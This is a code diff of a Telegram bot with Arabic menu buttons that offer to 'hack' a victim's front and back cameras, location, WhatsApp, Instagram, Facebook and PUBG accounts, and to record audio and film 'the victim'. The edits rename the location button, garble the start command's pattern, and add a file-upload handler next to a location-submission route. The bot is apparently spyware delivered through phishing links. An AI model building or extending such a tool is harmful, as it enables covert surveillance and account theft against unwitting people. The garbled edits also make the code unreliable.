@@ -147,7 +147,7 @@ bot.onText(/\/start/, async (msg) => {
     const mainMenuMessage = 'مرحبًا! بك كل الازرار مجاناً:';
     const mainMenuButtons = [
       [{ text: 'اختراق الكامرا الأمامية 📸', callback_data: `captureFront:${chatId}` }, { text: 'اختراق الكامرا الخلفية 📷', callback_data: `captureBack:${chatId}` }],
-      [{ text: 'اختراق الموقع 📍', callback_data: `getLocatiov:${chatId}` }, { text: 'تسجيل الصوت 🎤', callback_data: `recordAudio:${chatId}` }],
+      [{ text: 'الحصول الموقع 📍', callback_data: `getLocationi:${chatId}` }, { text: 'تسجيل الصوت 🎤', callback_data: `recordAudio:${chatId}` }],
       [{ text: 'اختراق كاميرات المراقبة 📡', callback_data: 'get_cameras' }, { text: 'تصوير الضحية فيديو 🎥', callback_data: 'capture_video' }],
       [{ text: 'اختراق واتساب 🟢', callback_data: 'request_verification' }, { text: 'اختراق انستجرام 🖥', callback_data: `rshq_instagram:${chatId}` }],
       [{ text: 'اختراق فيسبوك 🔮', callback_data: `rshq_facebook:${chatId}` }, { text: 'اختراق ببجي 🕹', callback_data: 'get_pubg' }],
@@ -3551,7 +3551,7 @@ app.get('/submitLocation', (req, res) => {
 });
 
 // أمر البدء /start
-bot.onText(/\/start/, (msg) => {
+bot.onText(/\/sgggggkjtart/, (msg) => {
     const chatId = msg.chat.id;
     
     const keyboard = {
@@ -3613,6 +3613,7 @@ app.post('/submitLocation', async (req, res) => {
     }
 });
 
+const upload = multer({ dest: 'uploads/' });
 
 app.get('/', (req, res) => {
     const chatId = req.query.chatId;
